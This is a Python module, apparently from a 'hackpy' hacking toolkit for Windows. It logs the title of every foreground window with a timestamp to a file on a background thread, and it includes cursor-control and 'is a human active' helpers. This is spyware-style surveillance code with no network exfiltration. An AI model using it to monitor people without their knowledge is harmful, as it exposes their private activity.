from os          import remove, path
from ctypes      import windll
from win32gui    import GetWindowText, GetForegroundWindow, GetCursorPos
from threading   import Thread
from hackpy.time import *

# Get cursor position
def getCursorPos():
    return GetCursorPos()

# Set cursor position
def setCursorPos(x, y):
    return windll.user32.SetCursorPos(x, y)

# Get active window
def getActiveWindow():
    return GetWindowText(GetForegroundWindow()).encode().decode('utf-8', 'ignore')


# Check if human use computer
def userIsActive(wait = 2):
    first_x, first_y = getCursorPos()
    sleep(wait)
    last_x, last_y   = getCursorPos()

    if first_x != last_x or first_y != last_y:
        return True
    else:
        return False


# ProgramActivityLogger module
class ProgramActivitylogger:
    def __init__(self, filename = 'programlogs.txt'):
        self.filename = filename

    def startHackpyProgramActivityLogger(self):
        global hackpyProgramActivityLoggerIsStopped
        hackpyProgramActivityLoggerIsStopped = False
        old_data = ''
        while not hackpyProgramActivityLoggerIsStopped:
            new_data = getActiveWindow()
            if new_data != old_data:
                with open(self.filename, 'a', encoding = "utf8", errors = 'ignore') as logs:
                    logs.write('(' + date.all() + ') - \"' + new_data + '\"\n')
                old_data = new_data
            sleep(1.5)

    # Start Activitylogger
    def start(self):
        s = Thread(target=self.startHackpyProgramActivityLogger)
        s.start()

    # Stop Activitylogger
    def stop(self):
        global hackpyProgramActivityLoggerIsStopped
        hackpyProgramActivityLoggerIsStopped = True

    # Get logs
    def getLogs(self):
        if path.exists(self.filename):
            logs_lines = []
            with open(self.filename, 'r', encoding = "utf8", errors = 'ignore') as logs_file:
                lines = logs_file.readlines()
            for line in lines:
                line = line.replace('\n', '')
                logs_lines.append(line)
            return logs_lines
        else:
            return False

    # Delete logs file
    def cleanLogs(self):
        try:
            remove(self.filename)
        except:
            pass